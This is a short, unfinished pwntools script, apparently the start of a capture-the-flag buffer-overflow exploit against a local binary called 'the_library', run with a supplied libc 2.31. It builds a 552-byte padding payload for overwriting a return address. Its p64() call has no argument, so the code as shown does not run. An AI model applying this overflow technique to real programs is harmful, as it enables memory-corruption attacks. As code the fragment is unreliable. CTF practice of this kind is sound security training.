from pwn import *


payload = 'A'*552+p64()
io = process('./the_library', {"LD_PRELOAD":"./libc-2.31.so"})
print(io.recvuntil("> "))
